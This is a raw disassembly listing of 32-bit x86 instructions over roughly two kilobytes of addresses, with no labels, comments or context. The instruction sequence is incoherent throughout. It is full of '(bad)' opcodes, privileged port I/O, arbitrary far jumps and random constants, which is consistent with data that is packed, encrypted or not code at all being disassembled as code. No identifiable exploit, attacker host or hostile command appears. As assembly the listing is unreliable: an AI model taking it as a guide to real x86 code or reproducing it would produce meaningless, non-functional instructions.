  41945c:	dec    ebx
  41945d:	lds    eax,FWORD PTR [edi]
  41945f:	sbb    esp,edx
  419461:	mov    ecx,0x622bdcb5
  419466:	mov    bh,0x15
  419468:	bound  ebp,QWORD PTR [edi-0x58ed8830]
  41946e:	fst    QWORD PTR [ebp-0x72]
  419471:	pop    edi
  419472:	(bad)  
  419473:	mov    al,0xa1
  419475:	pop    es
  419476:	cs xor eax,0xf6341ea8
  41947c:	push   esi
  41947d:	or     BYTE PTR [ebx],ch
  41947f:	pop    ebp
  419480:	ja     0x4194c6
  419482:	mov    WORD PTR [eax*8-0x7d067f7c],ss
  419489:	mov    al,0x10
  41948b:	push   eax
  41948c:	jl     0x419417
  41948e:	dec    ecx
  41948f:	jne    0x4194e8
  419491:	test   al,0x48
  419493:	or     al,0x30
  419495:	loop   0x419429
  419497:	stos   BYTE PTR es:[edi],al
  419498:	gs cli 
  41949a:	add    al,0x21
  41949c:	pop    edx
  41949d:	push   ebp
  41949e:	pop    edi
  41949f:	adc    al,0xa0
  4194a1:	adc    ch,ch
  4194a3:	out    dx,al
  4194a4:	int    0xff
  4194a6:	mov    esp,0x339bb442
  4194ab:	cmp    eax,0x3bff1a1b
  4194b0:	rcl    BYTE PTR [esi-0xd],1
  4194b3:	add    edi,edi
  4194b5:	fild   QWORD PTR [esi]
  4194b7:	xchg   ebp,eax
  4194b8:	or     al,BYTE PTR [ecx+0x5e7e6d7f]
  4194be:	jle    0x41948d
  4194c0:	fsub   QWORD PTR es:[ebp+0x4d]
  4194c4:	pop    ds
  4194c5:	and    ebx,DWORD PTR [edx+esi*4+0x744f8a25]
  4194cc:	out    0xdc,eax
  4194ce:	pop    es
  4194cf:	pop    edx
  4194d0:	call   FWORD PTR [eax+0x39ece09b]
  4194d6:	scas   al,BYTE PTR es:[edi]
  4194d7:	loop   0x4194a4
  4194d9:	loop   0x4194cd
  4194db:	jne    0x4194b3
  4194dd:	dec    ebp
  4194de:	(bad)  
  4194df:	(bad)  
  4194e0:	xor    edx,edi
  4194e2:	test   DWORD PTR [esi-0x11d14c24],esi
  4194e8:	mov    edx,0x5ead6c12
  4194ed:	add    dh,BYTE PTR [esi]
  4194ef:	mov    bh,0x16
  4194f1:	inc    esp
  4194f2:	jns    0x4194cd
  4194f4:	xchg   esi,eax
  4194f5:	add    ch,bh
  4194f7:	mov    ds:0x5101d0f6,eax
  4194fc:	jge    0x419559
  4194fe:	and    BYTE PTR [esi-0x6a808787],ah
  419504:	(bad)  
  419505:	cmp    ebp,eax
  419507:	mov    ah,BYTE PTR [ecx+ecx*2-0x1]
  41950b:	mov    ebp,ecx
  41950d:	jmp    0x41951d
  41950f:	rol    BYTE PTR [ebp+eax*1-0x7798993f],cl
  419516:	fsub   DWORD PTR [ecx+eiz*8]
  419519:	cdq    
  41951a:	xor    DWORD PTR [ebp+eiz*4+0x1852d32e],esi
  419521:	push   esi
  419522:	xchg   esi,eax
  419523:	rcl    DWORD PTR [ebp+0x54],0x59
  419527:	adc    ecx,esp
  419529:	dec    ebx
  41952a:	cld    
  41952b:	pop    ss
  41952c:	test   DWORD PTR [edi-0x76],esi
  41952f:	test   BYTE PTR [eax-0x5],dh
  419532:	pop    edi
  419533:	cld    
  419534:	test   al,0xdd
  419536:	xchg   ebp,eax
  419537:	push   esp
  419538:	push   edx
  419539:	lock ins BYTE PTR es:[edi],dx
  41953b:	pop    ss
  41953c:	push   0xdc6663bc
  419541:	mov    cl,0xa7
  419543:	shr    BYTE PTR [esi+ebx*4],cl
  419546:	test   al,0x6d
  419548:	add    BYTE PTR [ebp-0x461e5947],bh
  41954e:	je     0x4195ae
  419550:	push   ebp
  419551:	push   ds
  419552:	xor    eax,0x6d14fa4a
  419557:	jne    0x419508
  419559:	aad    0x98
  41955b:	pop    edi
  41955c:	sbb    al,0xad
  41955e:	call   0xafb2:0x2ec99839
  419565:	mov    ecx,0x2ea068d6
  41956a:	arpl   WORD PTR [ecx+eax*4+0x1162f2e1],di
  419571:	fstp   TBYTE PTR [ebx+eiz*4-0x2a9ef2f3]
  419578:	pop    esp
  419579:	mov    bl,0xda
  41957b:	push   ss
  41957c:	pop    esi
  41957d:	imul   esi,DWORD PTR [edx],0x45
  419580:	mov    eax,0xda6e80f1
  419585:	adc    eax,ebx
  419587:	scas   al,BYTE PTR es:[edi]
  419588:	mov    esi,0x4f6a98ae
  41958d:	push   es
  41958e:	add    al,0xf
  419590:	add    bl,BYTE PTR ds:0x1964023a
  419596:	repz jno 0x419607
  419599:	or     eax,0x3b39f614
  41959e:	pop    esi
  41959f:	dec    eax
  4195a0:	(bad)  
  4195a1:	pop    ecx
  4195a2:	pop    ebp
  4195a3:	sub    BYTE PTR [edi],0x1d
  4195a6:	pop    ecx
  4195a7:	push   es
  4195a8:	clc    
  4195a9:	push   esi
  4195aa:	fbld   TBYTE PTR [edi-0x20]
  4195ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195ae:	or     eax,0x2d8de5fd
  4195b3:	xchg   ebx,eax
  4195b4:	pop    ecx
  4195b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195b6:	xchg   ebp,eax
  4195b7:	(bad)  
  4195b8:	stc    
  4195b9:	dec    esi
  4195ba:	mov    ds:0x270e048,eax
  4195bf:	das    
  4195c0:	inc    eax
  4195c1:	ret    
  4195c2:	and    al,0xe9
  4195c4:	daa    
  4195c5:	jmp    0xbd90:0xe3eb63ac
  4195cc:	pop    ebp
  4195cd:	dec    ecx
  4195ce:	pop    esi
  4195cf:	mov    BYTE PTR [esi-0xb],ah
  4195d2:	dec    esi
  4195d3:	in     eax,0x8
  4195d5:	popf   
  4195d6:	cdq    
  4195d7:	fist   DWORD PTR [edi-0x46]
  4195da:	popf   
  4195db:	mov    ds:0xf3b2fcf4,eax
  4195e0:	jp     0x41956e
  4195e2:	shl    DWORD PTR [ebp-0x76185a37],1
  4195e8:	jns    0x4195cd
  4195ea:	jmp    0x7a860b27
  4195ef:	xor    dh,BYTE PTR [ecx]
  4195f1:	sbb    eax,0xd3da86eb
  4195f6:	jb     0x419675
  4195f8:	cwde   
  4195f9:	leave  
  4195fa:	jno    0x41957d
  4195fc:	mov    ebx,0xcf3d36c0
  419601:	xchg   BYTE PTR [edx+0x779cb4e0],bl
  419607:	cmp    dl,bl
  419609:	stos   BYTE PTR es:[edi],al
  41960a:	mov    al,ds:0x39543166
  41960f:	iret   
  419610:	and    dh,ch
  419612:	fsub   st,st(4)
  419614:	lea    eax,[eax]
  419616:	or     ecx,DWORD PTR [eax-0x34]
  419619:	cld    
  41961a:	mov    bl,0xe2
  41961c:	mov    WORD PTR [eax+0x13],cs
  41961f:	lock mov WORD PTR ds:0xd6808704,ds
  419626:	push   edi
  419627:	xchg   ebp,eax
  419628:	mov    al,ds:0xb7fb6784
  41962d:	leave  
  41962e:	xchg   edi,esi
  419630:	fdivr  QWORD PTR [edi]
  419632:	jbe    0x41961d
  419634:	pop    ebx
  419635:	add    BYTE PTR [ebp+ecx*8-0x7c195345],dl
  41963c:	adc    bl,BYTE PTR [esi-0x6ee33bbf]
  419642:	in     al,0xa4
  419644:	dec    edx
  419645:	push   ds
  419646:	dec    esi
  419647:	test   cl,dl
  419649:	test   al,cl
  41964b:	adc    ch,cl
  41964d:	iret   
  41964e:	inc    eax
  41964f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419650:	lea    edi,[ebx-0x43516aae]
  419656:	das    
  419657:	push   edx
  419658:	fnstenv [ebp+0x4]
  41965b:	inc    ecx
  41965c:	cmp    BYTE PTR [edx-0x73b62015],0x1f
  419663:	and    BYTE PTR [edi-0xc],bh
  419666:	rcl    DWORD PTR ds:0xfdd9e5ef,0x41
  41966d:	mov    ah,BYTE PTR [esi]
  41966f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419670:	sbb    BYTE PTR [esi],bh
  419672:	ins    DWORD PTR es:[edi],dx
  419673:	mov    edx,0x2f6c309b
  419678:	xor    eax,0x3e4b1e1e
  41967d:	mov    dh,0xf4
  41967f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419680:	mov    eax,ds:0x24f413b6
  419685:	push   ebx
  419686:	mov    cl,0xd1
  419688:	addr16 inc edi
  41968a:	jns    0x4196db
  41968c:	mov    ch,0x11
  41968e:	cmp    eax,0xa555bb9b
  419693:	sub    BYTE PTR [esi],cl
  419695:	jmp    0x2bc40dbb
  41969a:	dec    ebx
  41969b:	add    eax,0xe4786b77
  4196a0:	push   cs
  4196a1:	xor    dh,ah
  4196a3:	mov    ch,0xc0
  4196a5:	fcomp  DWORD PTR [ebx+0x6a]
  4196a8:	xchg   ebx,eax
  4196a9:	mov    esp,0x5b7c0b12
  4196ae:	popa   
  4196af:	push   esi
  4196b0:	cmp    ecx,DWORD PTR [ecx+0x7d]
  4196b3:	or     DWORD PTR [edi-0x1955d311],ecx
  4196b9:	mov    esi,0x66485a77
  4196be:	and    ebx,DWORD PTR [eax]
  4196c0:	push   edi
  4196c1:	lahf   
  4196c2:	or     ah,BYTE PTR [ebp+ecx*1-0x58]
  4196c6:	(bad)  
  4196c7:	ret    0xf44f
  4196ca:	mov    dh,0x7d
  4196cc:	and    DWORD PTR [ecx+0x40],eax
  4196cf:	push   edx
  4196d0:	stos   BYTE PTR es:[edi],al
  4196d1:	push   edi
  4196d2:	into   
  4196d3:	jb     0x419669
  4196d5:	pop    esi
  4196d6:	outs   dx,DWORD PTR ds:[esi]
  4196d7:	push   esp
  4196d8:	push   eax
  4196d9:	into   
  4196da:	pop    eax
  4196db:	xchg   DWORD PTR [eax+0x21c6fe11],ecx
  4196e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196e2:	lock mov BYTE PTR [edi],bh
  4196e5:	retf   0xa5f2
  4196e8:	sahf   
  4196e9:	mov    gs,WORD PTR ds:0x91ab973d
  4196ef:	jno    0x41971e
  4196f1:	mov    bh,0xa3
  4196f3:	jmp    0x6cf8:0xce9e12a0
  4196fa:	cdq    
  4196fb:	icebp  
  4196fc:	fnstsw WORD PTR [edx-0x3]
  4196ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419700:	inc    edi
  419701:	nop
  419702:	mov    esp,0x41654aef
  419707:	pusha  
  419708:	test   DWORD PTR [eax+0x36],esi
  41970b:	mov    eax,0xb27eb4e2
  419710:	dec    edi
  419711:	inc    esi
  419712:	sti    
  419713:	ss pop ebx
  419715:	gs enter 0xeb70,0x5e
  41971a:	pushf  
  41971b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41971c:	mov    ds:0x249709ad,al
  419721:	out    0xb6,eax
  419723:	push   esi
  419724:	lea    edi,[eax-0x63]
  419727:	bound  esp,QWORD PTR [edx+0x8]
  41972a:	jmp    0x64f9bc29
  41972f:	data16 cli 
  419731:	add    DWORD PTR [eax+0x28],ecx
  419734:	jg     0x419771
  419736:	add    eax,0xb9714648
  41973b:	adc    ch,BYTE PTR ds:0x5d42784e
  419741:	in     eax,0xc7
  419743:	or     al,0x82
  419745:	jne    0x419776
  419747:	in     eax,dx
  419748:	adc    dl,dl
  41974a:	call   0xe1ff917d
  41974f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419750:	push   edi
  419751:	adc    eax,0xc63fd442
  419756:	fidiv  WORD PTR [ebx]
  419758:	mov    esp,0x2c78169
  41975d:	dec    eax
  41975e:	xchg   esp,eax
  41975f:	pop    ss
  419760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419761:	cmc    
  419762:	pop    ebx
  419763:	ret    0x88c3
  419766:	mov    al,ds:0x7f6f9be6
  41976b:	fstp   TBYTE PTR [edx-0x72]
  41976e:	pop    eax
  41976f:	jne    0x41976b
  419771:	sbb    al,0x45
  419773:	(bad)  
  419774:	ffreep st(5)
  419776:	shr    BYTE PTR [esi-0x6d29b0aa],0x9d
  41977d:	popa   
  41977e:	mov    ds:0xe91a9ac7,eax
  419783:	push   0x828ef7f6
  419788:	scas   eax,DWORD PTR es:[edi]
  419789:	clc    
  41978a:	xor    esi,ebx
  41978c:	dec    edx
  41978d:	and    edi,DWORD PTR [esi+edx*2-0x4e]
  419791:	std    
  419792:	shl    BYTE PTR [ebp+0x5c6d6d93],0x3b
  419799:	jbe    0x4197e1
  41979b:	jo     0x41977b
  41979d:	inc    BYTE PTR [edx]
  41979f:	dec    edx
  4197a0:	inc    eax
  4197a1:	hlt    
  4197a2:	dec    ebp
  4197a3:	sub    bh,BYTE PTR [ebp+0x49]
  4197a6:	aaa    
  4197a7:	js     0x41978f
  4197a9:	icebp  
  4197aa:	stc    
  4197ab:	les    ebx,FWORD PTR [esi-0x648052c5]
  4197b1:	sub    al,0xef
  4197b3:	xchg   ebp,eax
  4197b4:	cmp    ch,dh
  4197b6:	mov    dh,0x8e
  4197b8:	mov    ch,0xb9
  4197ba:	sub    al,0xfc
  4197bc:	xchg   ebp,eax
  4197bd:	xor    edx,DWORD PTR [eax+0x6c4cfc75]
  4197c3:	repnz mov DWORD PTR [edi-0x13],edi
  4197c7:	test   al,0x53
  4197c9:	cdq    
  4197ca:	mov    ds:0x70263a2d,al
  4197cf:	jno    0x419766
  4197d1:	mov    cl,0xb
  4197d3:	mov    edx,esi
  4197d5:	cli    
  4197d6:	mov    edx,0x6bd2dc7f
  4197db:	(bad)  
  4197dc:	fnstenv [ecx-0x4a]
  4197df:	ror    DWORD PTR ds:0x6a3b90d0,0xab
  4197e6:	pop    eax
  4197e7:	jg     0x41983b
  4197e9:	(bad)
  4197ed:	pop    ss
  4197ee:	xor    BYTE PTR ds:0x7bcc208f,bl
  4197f4:	aam    0xc9
  4197f6:	pop    ebp
  4197f7:	xor    al,0x30
  4197f9:	cld    
  4197fa:	sub    al,0x12
  4197fc:	jo     0x419840
  4197fe:	push   eax
  4197ff:	jo     0x41985b
  419801:	fdivr  st,st(6)
  419803:	(bad)  
  419805:	fwait
  419806:	add    ebx,DWORD PTR ds:0x3cdbee24
  41980c:	inc    eax
  41980d:	mov    al,0x5b
  41980f:	cmp    ah,BYTE PTR [eax+0x47]
  419812:	dec    edx
  419813:	jecxz  0x419871
  419815:	dec    ebp
  419816:	sub    al,0xb1
  419818:	fbld   TBYTE PTR [edx+0x9]
  41981b:	dec    ebp
  41981c:	int    0xef
  41981e:	mov    ch,0xfb
  419820:	imul   ebp,ebx,0xd169930e
  419826:	jp     0x4197be
  419828:	adc    ah,BYTE PTR [ebx]
  41982a:	ins    DWORD PTR es:[edi],dx
  41982b:	(bad)  
  41982c:	sbb    cl,BYTE PTR [ebx]
  41982e:	push   ecx
  41982f:	shl    DWORD PTR [ecx-0x1b],1
  419832:	cmc    
  419833:	ins    BYTE PTR es:[edi],dx
  419834:	sti    
  419835:	clc    
  419836:	nop
  419837:	fstp   QWORD PTR ds:0x990562c9
  41983d:	add    al,BYTE PTR [ecx]
  41983f:	push   edi
  419840:	sub    cl,BYTE PTR [ebp+0x3b]
  419843:	xor    dh,BYTE PTR [edi-0x68063447]
  419849:	push   esi
  41984a:	cmovns eax,DWORD PTR [ecx+esi*2+0x157f1622]
  419852:	mov    dl,ch
  419854:	pop    esp
  419855:	ficomp WORD PTR [ebp+0x6f]
  419858:	push   edi
  419859:	xchg   esi,eax
  41985a:	mov    edx,0x67cb3021
  41985f:	sub    cl,BYTE PTR [edi-0x4b]
  419862:	xchg   edx,eax
  419863:	jg     0x4197f5
  419865:	push   ecx
  419866:	adc    BYTE PTR [esi-0xd516e98],ch
  41986c:	xchg   dh,bl
  41986e:	retf   
  41986f:	jo     0x419870
  419871:	in     eax,0x11
  419873:	push   ds
  419874:	push   eax
  419875:	xor    eax,0x5735de7
  41987a:	bound  ebx,QWORD PTR [ebp+0x59]
  41987d:	sbb    al,0xb8
  41987f:	push   0xffffff9b
  419881:	div    BYTE PTR [edx+0x40]
  419884:	in     al,dx
  419885:	cmp    BYTE PTR [ebx+0x79],al
  419888:	mov    ds:0xb9bc5d51,al
  41988d:	stos   DWORD PTR es:[edi],eax
  41988e:	loop   0x4198ca
  419890:	mov    esi,0x8e2c5c40
  419895:	pushf  
  419896:	push   ds
  419897:	or     DWORD PTR [ebx+0x217d2757],0xffffffbb
  41989e:	mov    bh,BYTE PTR [esi-0x25]
  4198a1:	dec    eax
  4198a2:	leave  
  4198a3:	loop   0x419873
  4198a5:	push   cs
  4198a6:	push   ss
  4198a7:	mov    BYTE PTR [ecx+eax*2-0x1d6b49ec],dh
  4198ae:	mov    ch,0xb
  4198b0:	fldcw  WORD PTR [eax+ebp*2-0x4b23276f]
  4198b7:	pop    ecx
  4198b8:	pushf  
  4198b9:	cmp    DWORD PTR [edx],esp
  4198bb:	xor    eax,0x1f09a386
  4198c0:	jg     0x419869
  4198c2:	test   eax,0xed547955
  4198c7:	sbb    eax,0x17691302
  4198cc:	mov    WORD PTR [edi],fs
  4198ce:	or     eax,0xffffffec
  4198d1:	dec    esp
  4198d2:	dec    ebp
  4198d3:	dec    ecx
  4198d4:	xchg   esi,eax
  4198d5:	inc    ebp
  4198d6:	sbb    BYTE PTR [edi+0x42a0c1db],cl
  4198dc:	push   es
  4198dd:	push   ecx
  4198de:	jne    0x4198d7
  4198e0:	inc    esp
  4198e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198e2:	cmp    edx,esp
  4198e4:	arpl   WORD PTR [eax+0x1eb8d7bc],si
  4198ea:	jne    0x4198ae
  4198ec:	mov    edx,0xb0de0241
  4198f1:	and    edx,edi
  4198f3:	dec    ebp
  4198f4:	push   sp
  4198f6:	test   eax,0x4f0690f
  4198fb:	dec    esp
  4198fc:	addr16 lahf 
  4198fe:	jg     0x4198c6
  419900:	push   ss
  419901:	mov    edi,db3
  419904:	outs   dx,DWORD PTR ds:[esi]
  419905:	or     al,0x54
  419907:	fimul  WORD PTR [ecx-0xa]
  41990a:	dec    esi
  41990b:	xchg   ebp,eax
  41990c:	mov    al,ds:0x40e6b82
  419911:	ret    
  419912:	dec    ebx
  419913:	scas   eax,DWORD PTR es:[edi]
  419914:	pusha  
  419915:	cli    
  419916:	push   ss
  419917:	retf   0x902e
  41991a:	mov    al,ds:0x6f62d8dc
  41991f:	aaa    
  419920:	fucomi st,st(3)
  419922:	fstp   QWORD PTR [edi]
  419924:	push   esp
  419925:	out    dx,eax
  419926:	test   DWORD PTR [eax-0x6546ada6],edi
  41992c:	lahf   
  41992d:	mov    edx,0x15680508
  419932:	int3   
  419933:	cdq    
  419934:	xchg   ecx,eax
  419935:	cmc    
  419936:	in     al,0xb3
  419938:	out    dx,al
  419939:	push   0x75879efd
  41993e:	cld    
  41993f:	inc    ebp
  419940:	push   ebp
  419941:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  419943:	dec    edx
  419944:	lock je 0x4198ef
  419947:	lods   eax,DWORD PTR ds:[esi]
  419948:	adc    eax,0x52be0fdc
  41994d:	xchg   edi,eax
  41994e:	(bad)  
  41994f:	push   eax
  419950:	jge    0x4199cf
  419952:	(bad)  [edx+esi*2+0x1e]
  419956:	jne    0x4198f8
  419958:	push   esp
  419959:	xor    al,0x93
  41995b:	sub    eax,0x3293692b
  419960:	mov    DWORD PTR [edx+0x6f],ebx
  419963:	fcmovu st,st(7)
  419965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419966:	retf   0x23b8
  419969:	out    0xe7,eax
  41996b:	lock repnz mov WORD PTR [ecx+0xb],cs
  419970:	std    
  419971:	cli    
  419972:	loope  0x4199c7
  419974:	xor    DWORD PTR [eax+eax*4-0x30ab77e4],eax
  41997b:	mov    ds:0x7fd68db8,al
  419980:	mov    ebp,0x7208f426
  419985:	cmp    DWORD PTR [edx],0xe24728e9
  41998b:	imul   esp,DWORD PTR [ecx+esi*2],0x65
  41998f:	repnz xor DWORD PTR [edi+edi*2-0x7d],edx
  419994:	aas    
  419995:	test   eax,0x5142c58e
  41999a:	xor    DWORD PTR [ecx-0x55003cc],eax
  4199a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199a1:	pop    ecx
  4199a2:	pop    ebp
  4199a3:	nop
  4199a4:	mov    ebx,0x5bdf7f14
  4199a9:	jmp    0xb15a:0xdabeb01e
  4199b0:	dec    esp
  4199b1:	test   al,0x79
  4199b3:	push   ss
  4199b4:	jg     0x419953
  4199b6:	sub    BYTE PTR [ebx],bl
  4199b8:	in     eax,dx
  4199b9:	push   ss
  4199ba:	jno    0x4199d7
  4199bc:	jae    0x4199ea
  4199be:	lahf   
  4199bf:	cmp    DWORD PTR [ebx-0x4b33532b],ebp
  4199c5:	fidiv  DWORD PTR [edx]
  4199c7:	jo     0x419a15
  4199c9:	mov    esp,DWORD PTR [ebp*2+0x742886ed]
  4199d0:	mov    cl,0xa7
  4199d2:	pop    edi
  4199d3:	cmc    
  4199d4:	mov    eax,0xef2bf670
  4199d9:	pop    eax
  4199da:	(bad)  
  4199db:	xor    ch,dh
  4199dd:	mov    eax,ds:0x3261ea6b
  4199e2:	push   eax
  4199e3:	shl    DWORD PTR [ecx-0x3fbf9b49],0x49
  4199ea:	ss jae 0x4199e0
  4199ed:	bound  esi,QWORD PTR [ebp-0x6f3f3f8a]
  4199f3:	js     0x419983
  4199f5:	inc    ecx
  4199f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199f7:	stos   DWORD PTR es:[edi],eax
  4199f8:	neg    DWORD PTR [edx]
  4199fa:	mov    ecx,0x4d45793d
  4199ff:	and    DWORD PTR [ebx],edi
  419a01:	pop    esp
  419a02:	inc    ebp
  419a03:	js     0x4199ab
  419a05:	dec    esp
  419a06:	jl     0x419a13
  419a08:	jb     0x419a66
  419a0a:	in     al,dx
  419a0b:	test   al,0xf9
  419a0d:	lods   al,BYTE PTR ds:[esi]
  419a0e:	outs   dx,DWORD PTR ds:[esi]
  419a0f:	add    al,0xd5
  419a11:	cmp    dh,BYTE PTR [ebp+esi*8+0x7ceeb386]
  419a18:	dec    esp
  419a19:	cmp    ah,BYTE PTR [edi]
  419a1b:	stc    
  419a1c:	(bad)  
  419a1d:	cdq    
  419a1e:	call   0x214a4e36
  419a23:	jns    0x419a08
  419a25:	neg    DWORD PTR [edi]
  419a27:	sbb    BYTE PTR [ecx-0x6669f5de],bl
  419a2d:	mov    ebx,0x322b8cac
  419a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a33:	movsx  esp,ah
  419a36:	mul    DWORD PTR [edx]
  419a38:	sti    
  419a39:	rcl    BYTE PTR [eax],0x42
  419a3c:	idiv   DWORD PTR [edx]
  419a3e:	xchg   ecx,eax
  419a3f:	int    0x84
  419a41:	mov    al,ds:0x8d005111
  419a46:	cmc    
  419a47:	in     al,0x7e
  419a49:	das    
  419a4a:	jb     0x419a7e
  419a4c:	inc    esp
  419a4d:	jo     0x419a10
  419a4f:	cmp    BYTE PTR [eax+0x1a736889],dl
  419a55:	rep lods al,BYTE PTR ds:[esi]
  419a57:	pop    edx
  419a58:	xchg   edi,eax
  419a59:	inc    eax
  419a5a:	pop    esi
  419a5b:	inc    ebp
  419a5c:	retf   
  419a5d:	adc    BYTE PTR [edi-0x4e29e95e],al
  419a63:	(bad)  
  419a64:	jmp    0xdd21:0x252357e1
  419a6b:	inc    ebp
  419a6c:	jb     0x419a4b
  419a6e:	int    0x73
  419a70:	xchg   esp,eax
  419a71:	sub    bh,0x6f
  419a74:	sbb    BYTE PTR [ebx-0x7e],al
  419a77:	xchg   esp,eax
  419a78:	dec    ecx
  419a79:	jns    0x419a09
  419a7b:	clc    
  419a7c:	and    al,0xa1
  419a7e:	leave  
  419a7f:	lock jmp 0x419afb
  419a82:	sub    DWORD PTR [ecx+0x25051fca],edx
  419a88:	in     eax,dx
  419a89:	xchg   ecx,eax
  419a8a:	in     al,0x78
  419a8c:	fwait
  419a8d:	stos   DWORD PTR es:[edi],eax
  419a8e:	ins    BYTE PTR es:[edi],dx
  419a8f:	daa    
  419a90:	jnp    0x419b02
  419a92:	sahf   
  419a93:	and    ebp,esp
  419a95:	lds    edx,FWORD PTR [esi+0x3fd93b46]
  419a9b:	aam    0xf8
  419a9d:	out    dx,eax
  419a9e:	and    eax,0x768c0214
  419aa3:	sub    eax,0xf6d1d7e1
  419aa8:	mov    esi,0x579f8132
  419aad:	inc    esp
  419aae:	in     eax,dx
  419aaf:	aam    0x9a
  419ab1:	mov    eax,0xe755cfef
  419ab6:	jb     0x419a3a
  419ab8:	or     DWORD PTR [edx+edx*1+0x3be2c056],ebx
  419abf:	push   ebx
  419ac0:	(bad)  
  419ac1:	shl    BYTE PTR [eax-0x15365d38],0x21
  419ac8:	sbb    dh,BYTE PTR [ecx-0x26]
  419acb:	xor    esp,DWORD PTR [edx]
  419acd:	push   ecx
  419ace:	popa   
  419acf:	cmp    ebp,DWORD PTR [ecx]
  419ad1:	(bad)  
  419ad2:	retf   
  419ad3:	out    0x37,al
  419ad5:	mov    eax,0xbbfaa796
  419ada:	sar    BYTE PTR [ebx],1
  419adc:	and    DWORD PTR [esi+0x5c093582],edx
  419ae2:	mov    al,ds:0x403a0618
  419ae7:	(bad)  
  419ae8:	(bad)  
  419ae9:	cmp    eax,0x6307826e
  419aee:	mov    ds:0x73ede5b,eax
  419af3:	data16 mov dl,0xea
  419af6:	and    dl,BYTE PTR [eax]
  419af8:	nop
  419af9:	test   al,bh
  419afb:	shl    DWORD PTR [eax],1
  419afd:	adc    BYTE PTR [ebp-0x1f5668f6],bh
  419b03:	call   0xc2d7b181
  419b08:	push   ss
  419b09:	and    DWORD PTR [eax],esi
  419b0b:	fs sub al,0x2c
  419b0e:	das    
  419b0f:	dec    ecx
  419b10:	adc    esi,esi
  419b12:	test   DWORD PTR [esi+0x3a],ebx
  419b15:	dec    eax
  419b16:	push   cs
  419b17:	adc    bl,BYTE PTR [ebx-0x7a]
  419b1a:	sub    al,0x90
  419b1c:	cdq    
  419b1d:	cmp    bh,ch
  419b1f:	pop    edx
  419b20:	sahf   
  419b21:	lods   al,BYTE PTR ds:[esi]
  419b22:	inc    ebp
  419b23:	mov    eax,0xe5494c18
  419b28:	test   ebp,0xd3cdbd7d
  419b2e:	scas   eax,DWORD PTR es:[edi]
  419b2f:	xor    edi,DWORD PTR [ecx]
  419b31:	xor    eax,0x25628486
  419b36:	xchg   ebx,eax
  419b37:	in     al,0x68
  419b39:	sbb    DWORD PTR [esi],edi
  419b3b:	push   ss
  419b3c:	mov    edx,0xe63a518f
  419b41:	jecxz  0x419b5c
  419b43:	add    al,0x84
  419b45:	hlt    
  419b46:	dec    esp
  419b47:	xchg   BYTE PTR [esi-0x49],ch
  419b4a:	cmc    
  419b4b:	in     al,0x4c
  419b4d:	mov    eax,0x21484f5b
  419b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b53:	fdivr  DWORD PTR [esi-0x4b]
  419b56:	shl    BYTE PTR [ebx],1
  419b58:	leave  
  419b59:	cmp    eax,0xc273bffc
  419b5e:	rol    cl,cl
  419b60:	pop    ebp
  419b61:	and    ecx,DWORD PTR [esp+ebp*8]
  419b64:	mov    esi,0x72d6b38a
  419b69:	sub    ch,BYTE PTR [edx-0xd]
  419b6c:	fs nop
  419b6e:	fldcw  WORD PTR [esi]
  419b70:	in     al,0x7c
  419b72:	pop    ecx
  419b73:	ins    DWORD PTR es:[edi],dx
  419b74:	sbb    al,0xe6
  419b76:	(bad)  
  419b77:	stc    
  419b78:	call   0x9a9f:0x76128a88
  419b7f:	mov    ebx,0x6e3c7864
  419b84:	dec    esp
  419b85:	(bad)  
  419b86:	rcr    BYTE PTR [edi],1
  419b88:	mov    WORD PTR [esi],ds
  419b8a:	mov    dl,BYTE PTR [edi]
  419b8c:	arpl   WORD PTR [edx-0xa],ax
  419b8f:	mov    eax,DWORD PTR [eax+eax*1-0x3]
  419b93:	xor    dl,bh
  419b95:	icebp  
  419b96:	inc    ebp
  419b97:	cmp    eax,0xb3040ec8
  419b9c:	les    esi,FWORD PTR [esi-0x45c26322]
  419ba2:	imul   edx,DWORD PTR [eax+0x7fe586c5],0x66
  419ba9:	cmp    edx,DWORD PTR [esi-0x2d]
  419bac:	mov    esp,0xe4f50d1b
  419bb1:	push   esi
  419bb2:	mov    edx,gs
  419bb4:	push   ss
  419bb5:	out    0x53,al
  419bb7:	lahf   
  419bb8:	es xchg bl,ch
  419bbb:	xchg   esp,eax
  419bbc:	(bad)  
  419bbd:	pop    ss
  419bbe:	ret    
  419bbf:	mov    eax,cs:0xf6f4d26
  419bc5:	test   eax,0x97825474
  419bca:	rol    BYTE PTR [edi+0x4d],1
  419bcd:	int    0x3a
  419bcf:	jp     0x419b8d
  419bd1:	adc    BYTE PTR [ecx+0x5c46f2fe],0x18
  419bd8:	mov    BYTE PTR [edx],bl
  419bda:	test   bh,cl
  419bdc:	psubd  mm1,QWORD PTR [esi-0x6a]
  419be0:	xor    ch,BYTE PTR [ebp+0x6d]
  419be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419be4:	adc    BYTE PTR [edi],dl
  419be6:	repz loop 0x419b73
  419be9:	gs call 0x1cbc6a91
  419bef:	retf   0xe45e
  419bf2:	dec    esi
  419bf3:	xor    bl,ah
  419bf5:	and    ecx,0x5a
  419bf8:	or     al,0xc
  419bfa:	ja     0x419bd8
  419bfc:	or     edi,DWORD PTR [ebp-0x6d0bdff7]
  419c02:	mov    edx,0x3a6593db
  419c07:	pop    eax
  419c08:	push   ss
  419c09:	or     al,0x4c
  419c0b:	int3   
  419c0c:	clc    
  419c0d:	dec    edx
  419c0e:	inc    edx
  419c0f:	aaa    
  419c10:	sbb    ecx,DWORD PTR [eax]
